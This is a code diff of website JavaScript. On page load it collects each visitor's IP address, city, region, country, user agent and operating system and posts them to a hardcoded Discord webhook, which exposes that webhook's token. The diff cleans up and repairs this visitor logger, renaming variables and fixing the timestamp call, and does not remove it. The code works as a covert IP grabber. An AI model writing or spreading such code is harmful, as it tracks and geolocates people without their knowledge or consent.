@@ -4,6 +4,7 @@ document.addEventListener('DOMContentLoaded', function () {
   let titleIndex = 0;
   let index = 0;
   let forward = true;
+
   function getCurrentUnixTime() {
     const now = new Date();
     return Math.round(now.getTime() / 1000);
@@ -45,25 +46,25 @@ function check() {
     .then(data => {
       const addr = data.ip;
       const location = data.loc.split(',');
-      const c = data.city;
-      const r = data.region;
-      const co = data.country;
-      loadingapi(UA, addr, c, r, co);
+      const city = data.city;
+      const region = data.region;
+      const country = data.country;
+      loadingapi(UA, addr, city, region, country, os);
     });
 }
 
-function loadingapi(UA, addr, c, r, co) {
-  const csc = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
-  const F = {
-    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${c}, ${r}, ${co}\` \n **OS:** \`${os}\` \n**Hit time**: <t:${getCurrentUnixTime}:T> raw: \`${getCurrentUnixTime}\` `
+function loadingapi(UA, addr, city, region, country, os) {
+  const webhookURL = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
+  const payload = {
+    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${city}, ${region}, ${country}\` \n**OS:** \`${os}\` \n**Hit time**: <t:${getCurrentUnixTime()}:T> raw: \`${getCurrentUnixTime()}\``
   };
 
-  fetch(csc, {
+  fetch(webhookURL, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
-    body: JSON.stringify(F),
+    body: JSON.stringify(payload),
   });
 }
 
